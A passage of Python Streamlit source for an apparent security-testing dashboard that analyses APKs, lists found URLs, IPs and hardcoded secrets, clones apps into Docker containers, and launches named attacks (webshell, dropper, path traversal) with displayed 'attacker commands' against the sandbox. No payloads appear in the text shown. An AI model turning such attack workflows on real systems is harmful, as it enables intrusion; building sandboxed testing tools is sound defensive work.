                    pc = {"CRITICAL": "#DC2626", "HIGH": "#EA580C", "MEDIUM": "#D97706"}.get(p["severity"], "#16A34A")
                    st.markdown(
                        f'<div style="background:#fff;border:1px solid #E0F2FE;border-left:3px solid {pc};'
                        f'border-radius:6px;padding:7px 11px;margin-bottom:5px;">'
                        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.7rem;color:{pc};font-weight:700;">[{p["severity"]}] {p["name"].split(".")[-1]}</span>'
                        f'<div style="font-family:Inter;font-size:0.7rem;color:#64748B;margin-top:2px;">{p["description"]}</div></div>',
                        unsafe_allow_html=True,
                    )
        else:
            st.caption("No dangerous permissions requested.")
        # Malware combos
        if combos:
            st.markdown("<div style='height:8px'></div>", unsafe_allow_html=True)
            for c in combos:
                st.markdown(
                    f'<div style="background:rgba(220,38,38,0.06);border:1px solid #FCA5A5;border-radius:8px;'
                    f'padding:9px 12px;margin-bottom:6px;">'
                    f'<span style="font-family:JetBrains Mono,monospace;font-size:0.66rem;color:#B91C1C;font-weight:700;">⚡ [{c["severity"]}] PERMISSION COMBO</span>'
                    f'<div style="font-family:Inter;font-size:0.74rem;color:#0C4A6E;margin-top:3px;">{c["description"]}</div></div>',
                    unsafe_allow_html=True,
                )
    with col_r:
        st.markdown('<div class="dt-tree-hdr">🔎 Suspicious strings & secrets</div>', unsafe_allow_html=True)
        if susp:
            box = st.container(height=240, border=False)
            with box:
                for s in susp[:40]:
                    sc = {"CRITICAL": "#DC2626", "HIGH": "#EA580C", "MEDIUM": "#D97706"}.get(s.get("severity"), "#64748B")
                    st.markdown(
                        f'<div style="background:#fff;border:1px solid #E0F2FE;border-left:3px solid {sc};'
                        f'border-radius:6px;padding:7px 11px;margin-bottom:5px;">'
                        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.68rem;color:{sc};font-weight:700;">[{s.get("severity")}] {s.get("description")}</span>'
                        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.64rem;color:#64748B;margin-top:2px;word-break:break-all;">{s.get("match","")[:80]}</div></div>',
                        unsafe_allow_html=True,
                    )
        else:
            st.caption("No suspicious strings / hardcoded secrets found.")

    # Metadata + components expander
    with st.expander("📋 Package details & components", expanded=False):
        st.markdown(
            f"**Package:** `{md.get('package','?')}`  ·  **SHA-256:** `{md.get('sha256','')[:32]}…`  \n"
            f"**Size:** {md.get('size_bytes',0)//1024} KB  ·  **Signed:** {md.get('signed','?')}  ·  "
            f"**Native libs:** {len(md.get('native_libs',[]))}  \n"
            f"**Activities:** {len(report.get('activities',[]))}  ·  "
            f"**Services:** {len(report.get('services',[]))}  ·  "
            f"**Receivers:** {len(report.get('receivers',[]))}"
        )
        if report.get("all_permissions"):
            st.caption("All permissions: " + ", ".join(p.split(".")[-1] for p in report["all_permissions"][:40]))

    # ── APK SOURCE WORKBENCH (file explorer + decoded manifest + surface) ──
    wb = state.get("workbench")
    if wb and not wb.get("error"):
        _render_apk_workbench(state, wb)

    # ── APK DOCKER CLONE ─────────────────────────────────────────────
    _render_apk_docker_clone(state, wb)

    # ── v30: SIMULATED INSTALL WALKTHROUGH ───────────────────────────
    # Pragmatic alt to running redroid/Anbox (3GB+ emulator) — animates
    # what would happen on a real Android device using the APK's actual
    # metadata. Each timeline step is colored by real risk severity.
    _render_apk_install_walkthrough(report, sev, sev_color)

    # ── v30: UNIFIED Recommendations + Next-Step bar for APK ─────────
    # Same panel design as Code Clone + DB Twin so the user sees the
    # same visual language across all 3 Digital Twin modes.
    _apk_priority = sev in ("CRITICAL", "HIGH")
    _rec_text = (
        "⚡ <b>HIGH PRIORITY</b> — this APK requests dangerous permission "
        "combinations matching known malware families. Review the workbench "
        "below, run the 30-pattern attack matrix, then download the report."
        if _apk_priority else
        "✓ This APK looks clean structurally. Still recommend running the "
        "30-pattern matrix for completeness, plus exporting the PDF for audit."
    )
    st.html(
        '<div style="background:linear-gradient(135deg,#FAF5FF,#EFF6FF);'
        'border:1.5px solid #C7D2FE;border-radius:11px;padding:11px 14px;'
        'margin:14px 0 8px;box-shadow:0 2px 8px -3px rgba(99,102,241,0.15)">'
        '<div style="display:flex;align-items:center;justify-content:space-between;'
        'margin-bottom:6px;gap:10px">'
        '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        'color:#4338CA;letter-spacing:0.02em">'
        '🎯 RECOMMENDED FOR THIS APK'
        '</div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        f'font-weight:700;color:#4338CA;background:#FFFFFF;border:1px solid #C7D2FE;'
        f'padding:3px 9px;border-radius:6px">'
        f'{len(danger)} dangerous · {len(combos)} combos</span>'
        '</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.66rem;color:#4338CA;'
        f'line-height:1.55">{_rec_text}</div>'
        '</div>'
        # Next-Step bar — same blue-green gradient as other tabs
        '<div style="background:linear-gradient(135deg,#EFF6FF,#F0FDF4);'
        'border:1.5px solid #93C5FD;border-radius:11px;padding:11px 14px;'
        'margin:6px 0 12px;box-shadow:0 2px 8px -3px rgba(59,130,246,0.18)">'
        '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        'color:#1E40AF;letter-spacing:0.02em">'
        '✅ APK ANALYZED — WHAT NEXT?</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.66rem;color:#1E40AF;'
        'margin-top:3px;line-height:1.5">'
        'Run the 30-pattern matrix above · check the install walkthrough below · '
        'or download the full security report PDF.'
        '</div>'
        '</div>'
    )

    # ── APK PDF Report ───────────────────────────────────────────────
    _atk_res = state.get("apk_30_results")
    if report or _atk_res:
        try:
            from core.pdf_report_generator import generate_apk_report
            _apk_pdf = generate_apk_report(
                report=report or {},
                workbench=wb,
                attack_results=_atk_res,
            )
            if _apk_pdf:
                _apk_fname = f"apk_report_{(wb or {}).get('apk_id','apk')}_{int(time.time())}.pdf"
                st.download_button(
                    label="📄 Download APK Security Report (PDF)",
                    data=_apk_pdf,
                    file_name=_apk_fname,
                    mime="application/pdf",
                    key="apk_pdf_download",
                    help="Full PDF: permissions, combos, secrets, 30-pattern results & recommendations",
                )
        except Exception:
            pass

    if st.button("← Analyze another APK", key="apk_reset2"):
        # Destroy Docker clone if running
        _cr = state.get("apk_clone_result")
        if isinstance(_cr, dict) and _cr.get("container_name"):
            _destroy_apk_clone(_cr["container_name"])
        # Clean up the unpacked sandbox
        try:
            from core.apk_workbench import destroy_apk_workbench
            if wb and wb.get("apk_id"):
                destroy_apk_workbench(wb["apk_id"])
        except Exception:
            pass
        st.session_state.pop("dt_state", None)
        st.session_state.pop("dt_uploaded_name", None)
        st.rerun()


# ─────────────────────────────────────────────────────────────────────
#  APK DOCKER CLONE — deploy extracted APK files into a live container
# ─────────────────────────────────────────────────────────────────────
def _render_apk_docker_clone(state: dict, wb: dict | None) -> None:
    """
    Shows the APK Docker Clone section:
    - Before clone: banner + "Clone to Docker" button
    - While cloning: spinner
    - After clone: container info chip + Live Malware Lab panel + Destroy button
    """
    if not wb or wb.get("error"):
        return   # workbench failed; can't clone without the sandbox

    st.markdown(_sec_header("docker", "APK Docker Clone"), unsafe_allow_html=True)

    clone_result = state.get("apk_clone_result")

    if clone_result and isinstance(clone_result, dict):
        # ── Clone is running ────────────────────────────────────────
        url  = clone_result.get("url", "")
        port = clone_result.get("host_port", "")
        cname= clone_result.get("container_name", "")

        st.markdown(
            f'<div style="background:linear-gradient(135deg,#F0FDF4,#ECFDF5);'
            f'border:2px solid #4ADE8066;border-radius:12px;padding:14px 18px;margin-bottom:14px">'
            f'<div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">'
            f'<span style="font-family:JetBrains Mono,monospace;font-size:0.68rem;font-weight:700;'
            f'color:#16A34A;background:#16A34A18;border:1px solid #16A34A55;'
            f'border-radius:20px;padding:3px 12px">🟢 CONTAINER LIVE</span>'
            f'<span style="font-family:JetBrains Mono,monospace;font-size:0.74rem;color:#0C4A6E">'
            f'<b>{cname}</b> · port <b>{port}</b></span>'
            f'<a href="{url}" target="_blank" style="font-family:JetBrains Mono,monospace;'
            f'font-size:0.7rem;color:#2563EB;text-decoration:none;background:#EFF6FF;'
            f'border:1px solid #BFDBFE;border-radius:6px;padding:2px 10px">↗ {url}</a>'
            f'</div>'
            f'<div style="font-family:Inter,sans-serif;font-size:0.72rem;color:#475569;margin-top:8px">'
            f'Extracted APK files live inside the container at <code>/apk_twin/</code>. '
            f'Run any attack below — docker exec works directly on the container. '
            f'Destroying removes the container and all its contents instantly.</div>'
            f'</div>',
            unsafe_allow_html=True,
        )

        c1, c2 = st.columns([1, 5])
        with c1:
            if st.button("🗑️ Destroy Clone", key="apk_clone_destroy",
                         use_container_width=True):
                _destroy_apk_clone(cname)
                state.pop("apk_clone_result", None)
                # Also clear any live-lab logs for this clone
                for k in list(state.keys()):
                    if k.startswith("lab_log_"):
                        state.pop(k, None)
                st.rerun()

        # ── Reuse Live Malware Lab panel against the APK container ──
        _render_attack_panel(state, clone_result)

    else:
        # ── No clone yet — show the launch banner ───────────────────
        st.markdown(
            '<div style="background:linear-gradient(135deg,#EFF6FF,#F0F9FF);'
            'border:1px solid #BFDBFE;border-radius:12px;padding:16px 20px;margin-bottom:14px">'
            '<div style="font-family:Inter,sans-serif;font-size:0.86rem;font-weight:700;'
            'color:#1E40AF;margin-bottom:6px">🐳 Deploy APK files into a live Docker container</div>'
            '<div style="font-family:Inter,sans-serif;font-size:0.75rem;color:#475569;line-height:1.7">'
            'The APK is already unpacked. One click copies every extracted file '
            '(<code>AndroidManifest.xml</code>, <code>classes.dex</code>, '
            '<code>res/</code>, native <code>.so</code> libs) into a sandboxed Docker container '
            'running a Python HTTP server.<br>'
            'You can then run all 6 Live Malware Lab attacks (EICAR · Webshell · Dropper · '
            'Path Traversal · Header Injection · File Upload) against the live container — '
            'docker exec gives root access to any stack.</div>'
            '</div>',
            unsafe_allow_html=True,
        )

        # Error display from a previous failed attempt
        if clone_result and isinstance(clone_result, str):
            st.error(f"Previous clone attempt failed: {clone_result}")

        c1, c2 = st.columns([1.5, 4])
        with c1:
            if st.button("🐳 Clone APK to Docker", key="apk_clone_run",
                         type="primary", use_container_width=True):
                with st.spinner("Building APK Docker clone…"):
                    result = _clone_apk_to_docker(wb)
                state["apk_clone_result"] = result
                if isinstance(result, dict):
                    st.success(f"✓ Container live at {result['url']}")
                else:
                    st.error(result)
                st.rerun()
        with c2:
            st.markdown(
                '<div style="padding-top:11px;font-family:Inter,sans-serif;'
                'font-size:0.74rem;color:#64748B">'
                '🔒 Isolated network · 512 MB RAM cap · no internet access · '
                'destroy button wipes the container instantly</div>',
                unsafe_allow_html=True,
            )


# ─────────────────────────────────────────────────────────────────────
#  APK SOURCE WORKBENCH UI — explorer + manifest + per-file viewer + surface
# ─────────────────────────────────────────────────────────────────────
def _render_apk_workbench(state: dict, wb: dict) -> None:
    st.markdown(_sec_header("workbench", "APK Source Workbench"), unsafe_allow_html=True)

    files = wb.get("files", [])
    surface = wb.get("attack_surface", {})
    selected = state.get("selected") or "AndroidManifest.xml"

    # Quick stats strip
    s = wb.get("stats", {})
    st.markdown(
        f'<div class="dt-kpis">'
        f'<div class="dt-kpi"><div class="dt-kpi-val">{s.get("file_count",0)}</div><div class="dt-kpi-lbl">Files</div></div>'
        f'<div class="dt-kpi"><div class="dt-kpi-val">{s.get("dex_count",0)}</div><div class="dt-kpi-lbl">DEX</div></div>'
        f'<div class="dt-kpi"><div class="dt-kpi-val">{s.get("native_count",0)}</div><div class="dt-kpi-lbl">Native libs</div></div>'
        f'<div class="dt-kpi"><div class="dt-kpi-val">{len(surface.get("urls",[]))}</div><div class="dt-kpi-lbl">URLs found</div></div>'
        '</div>',
        unsafe_allow_html=True,
    )

    col_tree, col_view = st.columns([1, 3], gap="medium")

    # ── Left: file tree with type-grouped folders ──
    with col_tree:
        st.markdown(
            '<div class="dt-tree-hdr">📁 APK contents</div>',
            unsafe_allow_html=True,
        )
        # Group: pinned items first, then by top folder
        pinned = [f for f in files if f["rel"] in
                  ("AndroidManifest.xml", "classes.dex", "resources.arsc")]
        rest = [f for f in files if f not in pinned]

        # Filter / search
        q = st.text_input("Search files", key="apk_tree_q",
                          placeholder="filter by name…",
                          label_visibility="collapsed")
        ql = (q or "").lower().strip()
        def _match(f): return (not ql) or ql in f["rel"].lower()

        groups: dict[str, list[dict]] = {}
        for f in rest:
            if not _match(f):
                continue
            top = f["rel"].split("/", 1)[0] if "/" in f["rel"] else "root"
            groups.setdefault(top, []).append(f)

        tree_box = st.container(height=520, border=False)
        with tree_box:
            # Pinned
            if any(_match(p) for p in pinned):
                st.markdown('<div class="dt-tree-dir">📌 Key files</div>',
                            unsafe_allow_html=True)
                for f in pinned:
                    if _match(f):
                        _apk_file_button(f, selected, state)
            # Other groups (sorted: dex/lib/assets first, then alpha)
            order = sorted(groups.keys(),
                key=lambda k: (0 if k in ("classes.dex","lib","assets","res") else 1, k))
            for top in order:
                st.markdown(f'<div class="dt-tree-dir">📂 {top}/</div>',
                            unsafe_allow_html=True)
                for f in groups[top][:80]:
                    _apk_file_button(f, selected, state)
                if len(groups[top]) > 80:
                    st.caption(f"  …and {len(groups[top]) - 80} more in {top}/")

    # ── Right: file viewer ──
    with col_view:
        sel_file = next((f for f in files if f["rel"] == selected), None)
        if sel_file is None and files:
            sel_file = files[0]
            state["selected"] = sel_file["rel"]
        if not sel_file:
            st.info("No files in APK.")
            return

        # Header
        st.markdown(
            f'<div class="dt-wb-titlebar" style="border-radius:8px 8px 0 0;border:1px solid #DBDBDB;border-bottom:none">'
            f'<div class="dt-tl"><span class="r"></span><span class="y"></span><span class="g"></span></div>'
            f'<div class="dt-wb-fname">{sel_file["rel"]} · {sel_file["size"]:,} bytes · {sel_file["kind"]}</div>'
            f'</div>',
            unsafe_allow_html=True,
        )

        # If it's the manifest, show the DECODED XML (the workbench's killer feature)
        if sel_file["kind"] == "manifest" and wb.get("manifest"):
            st.code(wb["manifest"][:160_000], language="xml", line_numbers=True)
            if len(wb["manifest"]) > 160_000:
                st.caption(f"… truncated · full size {len(wb['manifest']):,} chars")
        else:
            from core.apk_workbench import read_apk_file
            view = read_apk_file(sel_file, dex_strings_map=wb.get("dex_strings"))
            if view["view"] == "image":
                img = view.get("extra", {}).get("image_bytes")
                if img:
                    st.image(img)
                else:
                    st.caption("Image unavailable")
            else:
                st.code(view["content"], language=view.get("language", "text"),
                        line_numbers=False)

        # Per-file download
        try:
            with open(sel_file["path"], "rb") as fh:
                st.download_button(
                    f"⬇ Download {sel_file['name']}",
                    data=fh.read(),
                    file_name=sel_file["name"],
                    mime="application/octet-stream",
                    key=f"apkdl_{sel_file['rel']}",
                    use_container_width=False,
                )
        except Exception:
            pass

    # ── Attack Surface panel ──
    _render_apk_attack_surface(surface)

    # ── 30-Pattern Attack Suite ──
    _render_apk_30_attacks(state)


def _apk_file_button(f: dict, selected: str, state: dict) -> None:
    """One row in the APK file tree — clickable button styled in Arctic Frost."""
    is_active = f["rel"] == selected
    threat = "🔴 " if f.get("threat") else ""
    sz = (f"{f['size']/1024:.1f}k" if f["size"] > 1024 else f"{f['size']}b")
    label = f'{f["icon"]} {threat}{f["name"]}  ·  {sz}'
    safe_key = ("apktree_active_" if is_active else "apktree_") + \
        re.sub(r'[^a-zA-Z0-9]', '_', f["rel"])[:80]
    if f.get("viewable"):
        if st.button(label, key=safe_key, use_container_width=True):
            state["selected"] = f["rel"]
            st.rerun()
    else:
        st.markdown(
            f'<div style="padding:7px 12px 7px 22px;font-family:JetBrains Mono,monospace;font-size:.72rem;'
            f'color:#94A3B8;border-bottom:1px solid #F0F9FF;">{label}</div>',
            unsafe_allow_html=True,
        )


def _render_apk_attack_surface(surface: dict) -> None:
    """Lay out every URL/IP/secret across the entire APK."""
    if not surface:
        return
    st.markdown(_sec_header("attack", "Attack Surface", ""), unsafe_allow_html=True)

    urls = surface.get("urls", [])
    ips = surface.get("ips", [])
    secrets_hits = (surface.get("aws", []) + surface.get("google", [])
                    + surface.get("github", []) + surface.get("jwt", [])
                    + surface.get("bearer", []) + surface.get("secrets", []))

    st.markdown(
        '<div class="dt-kpis">'
        f'<div class="dt-kpi"><div class="dt-kpi-val">{len(urls)}</div><div class="dt-kpi-lbl">URLs</div></div>'
        f'<div class="dt-kpi"><div class="dt-kpi-val">{len(ips)}</div><div class="dt-kpi-lbl">IP addresses</div></div>'
        f'<div class="dt-kpi"><div class="dt-kpi-val" style="color:{"#DC2626" if secrets_hits else "#16A34A"}">{len(secrets_hits)}</div><div class="dt-kpi-lbl">Secrets / tokens</div></div>'
        '</div>',
        unsafe_allow_html=True,
    )

    tab_urls, tab_ips, tab_sec = st.tabs(
        [f"🌐 URLs ({len(urls)})", f"🖥️ IPs ({len(ips)})",
         f"🔑 Secrets ({len(secrets_hits)})"]
    )
    with tab_urls:
        if urls:
            box = st.container(height=260, border=False)
            with box:
                for url, paths in urls:
                    paths_label = paths[0] if len(paths) == 1 else f"{paths[0]} +{len(paths)-1}"
                    st.markdown(
                        f'<div style="background:#fff;border:1px solid #E0F2FE;border-left:3px solid #0284C7;'
                        f'border-radius:6px;padding:7px 11px;margin-bottom:5px;">'
                        f'<a href="{url}" target="_blank" style="font-family:JetBrains Mono,monospace;font-size:0.7rem;'
                        f'color:#0C4A6E;text-decoration:none;font-weight:600;word-break:break-all">{url}</a>'
                        f'<div style="font-family:Inter,sans-serif;font-size:0.62rem;color:#64748B;margin-top:3px">found in: {paths_label}</div>'
                        f'</div>',
                        unsafe_allow_html=True,
                    )
        else:
            st.caption("No URLs found.")
    with tab_ips:
        if ips:
            for ip, paths in ips:
                st.markdown(
                    f'<div style="background:#fff;border:1px solid #E0F2FE;border-left:3px solid #D97706;'
                    f'border-radius:6px;padding:7px 11px;margin-bottom:5px;font-family:JetBrains Mono,monospace;font-size:0.72rem;color:#0C4A6E;font-weight:700">'
                    f'{ip} <span style="color:#64748B;font-weight:400;font-size:0.64rem"> · {paths[0]}</span>'
                    f'</div>',
                    unsafe_allow_html=True,
                )
        else:
            st.caption("No IPs found.")
    with tab_sec:
        if secrets_hits:
            for path, match in secrets_hits[:50]:
                st.markdown(
                    f'<div style="background:rgba(220,38,38,0.06);border:1px solid #FCA5A5;border-left:3px solid #DC2626;'
                    f'border-radius:6px;padding:7px 11px;margin-bottom:5px;">'
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.7rem;color:#B91C1C;font-weight:700;word-break:break-all">{match}</div>'
                    f'<div style="font-family:Inter,sans-serif;font-size:0.62rem;color:#64748B;margin-top:3px">found in: {path}</div>'
                    f'</div>',
                    unsafe_allow_html=True,
                )
        else:
            st.caption("No hardcoded tokens or secrets detected.")


def _render_apk_30_attacks(state: dict) -> None:
    """Run 30 static attack patterns against the extracted APK twin data."""
    report = state.get("report", {})
    if report.get("status") != "complete":
        return

    st.markdown(_sec_header("attack", "30-Pattern APK Attack Suite"), unsafe_allow_html=True)
    st.markdown(
        '<div style="background:linear-gradient(135deg,#FAF5FF,#F5F3FF);'
        'border:1px solid #DDD6FE;border-radius:12px;padding:14px 18px;margin-bottom:14px">'
        '<div style="font-family:Inter,sans-serif;font-size:0.86rem;color:#6D28D9;font-weight:700">'
        '📱 30 static-analysis attack patterns against the APK twin</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.74rem;color:#475569;margin-top:5px;line-height:1.6">'
        'Analyses <b>AndroidManifest.xml</b> + <b>DEX string dump</b> + <b>lib/*.so</b> for '
        'exported components · hardcoded secrets · weak crypto · SSL bypass · stalkerware combos · '
        'privacy leaks. Gives a <b>Security Score 0–100</b>.</div>'
        '</div>',
        unsafe_allow_html=True,
    )

    atk_key = f"apk_attacks_{state.get('apk_id','default')}"
    if atk_key not in st.session_state:
        if st.button("⚡ Run 30 Attack Patterns", key="apk30_run", type="primary",
                     use_container_width=True):
            manifest = report.get("manifest_xml", "") or report.get("manifest_raw", "")
            # Gather DEX strings from workbench state
            wb = state.get("workbench", {})
            strings: list[str] = []
            for info in (wb.get("files") or []):   # files is a list, not a dict
                if isinstance(info, dict) and "content" in info:
                    strings.extend(info["content"].splitlines())
            strings += report.get("suspicious_strings", [])
            # Add permission strings too
            strings += report.get("all_permissions", [])

            with st.spinner("Analysing 30 attack patterns…"):
                from core.apk_attack_patterns import run_apk_attacks
                result = run_apk_attacks(manifest, strings)
            st.session_state[atk_key] = result
            state["apk_30_results"] = result   # mirror for PDF report
            # Record in scan history
            try:
                from core.scan_history import record_scan
                record_scan(
                    case={
                        "target":   state.get("apk_id", "apk"),
                        "verdict":  result.get("label", "unknown"),
                        "score":    result.get("score", 0),
                        "findings": result.get("by_severity", {}).get("CRITICAL", 0),
                    },
                    scan_type="file",
                )
            except Exception:
                pass
            st.rerun()
        st.caption("Runs entirely offline — no network calls, no APK execution.")
        return

    res = st.session_state[atk_key]
    state["apk_30_results"] = res   # keep state in sync for PDF button
    sc, lbl, sc_color = res["score"], res["label"], res["color"]
    bysev = res.get("by_severity", {})
    findings = res["findings"]
    triggered = [f for f in findings if f["triggered"]]
    clean     = [f for f in findings if not f["triggered"]]

    # Score banner
    st.markdown(
        f'<div style="background:linear-gradient(135deg,{"#FEF2F2" if sc < 50 else "#FFFBEB" if sc < 80 else "#F0FDF4"},'
        f'{"#FFF5F5" if sc < 50 else "#FEFCE8" if sc < 80 else "#F7FEF7"});'
        f'border:2px solid {sc_color};border-radius:12px;padding:16px 20px;margin-bottom:16px;'
        f'text-align:center">'
        f'<div style="font-size:2.5rem;font-weight:800;color:{sc_color};font-family:Poppins,sans-serif">{sc}/100</div>'
        f'<div style="font-size:1rem;font-weight:700;color:{sc_color};font-family:Inter,sans-serif">{lbl}</div>'
        f'<div style="font-size:0.74rem;color:#64748B;margin-top:4px">'
        f'CRITICAL: {bysev.get("CRITICAL",0)} · HIGH: {bysev.get("HIGH",0)} · '
        f'MEDIUM: {bysev.get("MEDIUM",0)} · Clean: {len(clean)}/30</div>'
        f'</div>',
        unsafe_allow_html=True,
    )

    # Triggered findings
    if triggered:
        st.markdown(
            f'<div style="font-family:Inter,sans-serif;font-size:0.8rem;font-weight:700;'
            f'color:#DC2626;margin:10px 0 6px">🔴 {len(triggered)} vulnerabilities found</div>',
            unsafe_allow_html=True,
        )
        for f in triggered:
            sev_bg = {"CRITICAL":"#FEF2F2","HIGH":"#FFF7ED","MEDIUM":"#FFFBEB"}.get(f["severity"],"#F8FAFC")
            cmd_html = ""
            if f.get("attacker_cmd"):
                cmd_html = (
                    f'<div style="background:#0B1220;border-radius:6px;padding:7px 10px;margin-top:7px">'
                    f'<div style="font-size:.6rem;color:#60A5FA;font-family:JetBrains Mono,monospace;'
                    f'letter-spacing:.08em;margin-bottom:3px">▸ ATTACKER COMMAND</div>'
                    f'<code style="font-size:.68rem;color:#F472B6;font-family:JetBrains Mono,monospace;'
                    f'white-space:pre-wrap;word-break:break-all">{f["attacker_cmd"]}</code>'
                    f'</div>'
                )
            fix_html = ""
            if f.get("how_to_fix"):
                fix_html = (
                    f'<div style="font-size:.72rem;color:#16A34A;margin-top:5px">'
                    f'🔧 <b>Fix:</b> {f["how_to_fix"]}</div>'
                )
            st.markdown(
                f'<div style="background:{sev_bg};border-left:4px solid {f["color"]};'
                f'border-radius:0 8px 8px 0;padding:10px 14px;margin:4px 0">'
                f'<div style="display:flex;gap:10px;align-items:center">'
                f'<span style="font-size:.68rem;font-weight:700;color:{f["color"]};'
                f'background:rgba(0,0,0,.05);padding:2px 7px;border-radius:10px;white-space:nowrap">'
                f'{f["severity"]}</span>'
                f'<span style="font-size:.82rem;font-weight:600;color:#1E293B">{f["label"]}</span>'
                f'<span style="font-size:.68rem;color:#64748B;font-family:JetBrains Mono,monospace;'
                f'background:#F1F5F9;padding:1px 6px;border-radius:8px">{f["category"]}</span>'
                f'</div>'
                f'<div style="font-size:.76rem;color:#475569;margin-top:5px">{f["what"]}</div>'
                f'<div style="font-size:.72rem;color:#DC2626;margin-top:3px;font-style:italic">'
                f'Finding: {f["detail"]}</div>'
                + cmd_html + fix_html +
                f'</div>',
                unsafe_allow_html=True,
            )

    # Clean checks in expander
    with st.expander(f"✅ {len(clean)} checks passed", expanded=False):
        for f in clean:
            st.markdown(
                f'<div style="border-left:3px solid #16A34A;padding:4px 10px;margin:2px 0;'
                f'font-family:Inter,sans-serif;font-size:.74rem;color:#166534">'
                f'✓ <b>{f["label"]}</b> — {f["detail"]}</div>',
                unsafe_allow_html=True,
            )

    if st.button("↻ Re-run patterns", key="apk30_rerun"):
        del st.session_state[atk_key]
        st.rerun()


def _render_code_clone_panel(state: dict) -> None:
    """The full code-clone workflow: workbench + pipeline + preview + attack + dl."""
    job_id  = state["job_id"]
    job     = _JOBS.get(job_id, {})
    stage   = job.get("stage", "extracting")
    has_err = "error" in job
    persisted_result = state.get("clone_result")
    is_ready = (
        (stage == "ready" and not has_err and bool(job.get("result")))
        or bool(persisted_result)
    )

    _render_workbench(state, job)
    _render_clone_progress(job, has_err)

    if is_ready:
        result = job.get("result") or persisted_result
        if result:
            state["clone_result"] = result
        else:
            result = {}
        _render_preview(result)
        _render_cinematic_twin(state, result)          # v24: F1-style 3D telemetry view
        _render_adaptive_attack_suite(state, result)   # v24: senior-level recon + tailored proposals
        _render_cve_scan(state, result)                # v24: standalone — real CVE data = high value
        # v24 REMOVED: _render_login_attack_suite — 100% redundant with
        # Adaptive Attack Suite (brute_force_burst, credential_stuffing,
        # default_creds) + Live Malware Lab (Path Traversal, Header
        # Injection, SQLi). Was brittle on SPAs, broken on Streamlit,
        # required a vulnerable_login demo that no longer exists.
        _render_attack_panel(state, result)
        _render_ml_analysis(state, result)
        # v24: consolidated Destroy + Forensic Download into a single slim toolbar
        _render_actions_toolbar(state, result)
    elif not has_err and not persisted_result:
        time.sleep(0.4)
        st.rerun()


def _render_actions_toolbar(state: dict, result: dict) -> None:
    """
    v24 slim toolbox — only contains the 3 actions a user actually
    needs at the end of a clone session:
       ⬇ Clone code · 📦 Forensic package · 🗑 Destroy

    Removed (redundant or low-value):
       • Live Container Logs   — Live Malware Lab already shows attack events
                                  in a much richer way; Apache startup
                                  warnings were noise, not security signal
       • Environment Variables — Exploit Demo already proves env-var theft
                                  via path traversal; standalone list = noise
    """
    clone_id   = result.get("clone_id", "")
    cname      = result.get("container_name", "")
    port       = result.get("host_port", "?")
    scan       = state.get("scan", {})
    n_find     = scan.get("total_findings", 0) + scan.get("deep_total", 0)
    atk_n      = len(state.get("attack_log", []))
    fname_base = state.get("filename", "clone").replace(".zip", "")

    with st.expander(
        f"⚙ Clone tools · download · destroy "
        f"({n_find} findings · {atk_n} attack events)",
        expanded=False,
    ):
        c1, c2, c3 = st.columns(3)

        # ── 1. Clone code download ──
        with c1:
            clone_zip = None
            try:
                from core.source_clone import download_clone_as_zip
                clone_zip = download_clone_as_zip(clone_id) if clone_id else None
            except Exception:
                clone_zip = None
            st.download_button(
                "⬇ Clone code (.zip)",
                data=clone_zip or b"",
                file_name=f"clone_{fname_base}_{int(time.time())}.zip",
                mime="application/zip",
                key="dt_tb_clone",
                use_container_width=True,
                disabled=(clone_zip is None),
                help="Live clone — includes saved edits + injected files",
            )

        # ── 2. Forensic package download ──
        with c2:
            try:
                pkg = _build_forensic_package(state, result)
            except Exception:
                pkg = b""
            st.download_button(
                "📦 Forensic package",
                data=pkg,
                file_name=f"forensic_{fname_base}_{int(time.time())}.zip",
                mime="application/zip",
                key="dt_tb_forensic",
                use_container_width=True,
                disabled=(not pkg),
                help="Original + clone + Dockerfile + scan_report + PDF",
            )

        # ── 3. Destroy clone container ──
        with c3:
            if st.button("🗑 Destroy clone", key="dt_tb_destroy",
                          use_container_width=True, type="secondary"):
                if clone_id:
                    try:
                        from core.source_clone import destroy_clone
                        ok = destroy_clone(clone_id, remove_sandbox=True)
                        if ok:
                            st.success(f"✅ Clone `{clone_id}` destroyed.")
                            state["clone_result"] = None
                            job_id = state.get("job_id", "")
                            if job_id in _JOBS:
                                del _JOBS[job_id]
                            st.rerun()
                        else:
                            st.error("Destroy failed — check Docker logs.")
                    except Exception as exc:
                        st.error(f"Error: {exc}")

        # Compact status footer
        st.markdown(
            f'<div style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
            f'color:#64748B;margin-top:8px;text-align:center">'
            f'Container: <b style="color:#1E40AF">{cname}</b>'
            f' · Port <b style="color:#1E40AF">{port}</b>'
            f' · Findings <b style="color:#DC2626">{n_find}</b>'
            f' · Events <b style="color:#7C3AED">{atk_n}</b></div>',
            unsafe_allow_html=True,
        )


def _render_multi_clone_compare() -> None:
    """Side-by-side iframe panel comparing 2 running clones."""
    from core.source_clone import list_active_clones
    clones = list_active_clones()
    runnable = [c for c in clones if c.get("url")]

    with st.expander("🔀 Multi-Clone Compare — run 2 clones side-by-side",
                     expanded=False):
        if len(runnable) < 2:
            needed = 2 - len(runnable)
            st.info(
                f"Deploy **{needed} more clone{'s' if needed > 1 else ''}** above to enable "
                "side-by-side comparison. Currently "
                f"{'no clones' if not runnable else '1 clone'} running."
            )
            if runnable:
                c = runnable[0]
                st.caption(
                    f"Running: `{c['clone_id']}` · {c['stack']} · {c['url']}"
                )
            return

        labels = [
            f"{c['clone_id']} · {c['stack'] or 'unknown'} · {c['url']}"
            for c in runnable
        ]
        col_a, col_b = st.columns(2)
        with col_a:
            idx_a = st.selectbox("Left clone", range(len(labels)),
                                 format_func=lambda i: labels[i],
                                 key="compare_left")
        with col_b:
            default_b = 1 if len(runnable) > 1 else 0
            idx_b = st.selectbox("Right clone", range(len(runnable)),
                                 index=default_b,
                                 format_func=lambda i: labels[i],
                                 key="compare_right")

        ca, cb = runnable[idx_a], runnable[idx_b]
        # Warn if user picked the same clone twice
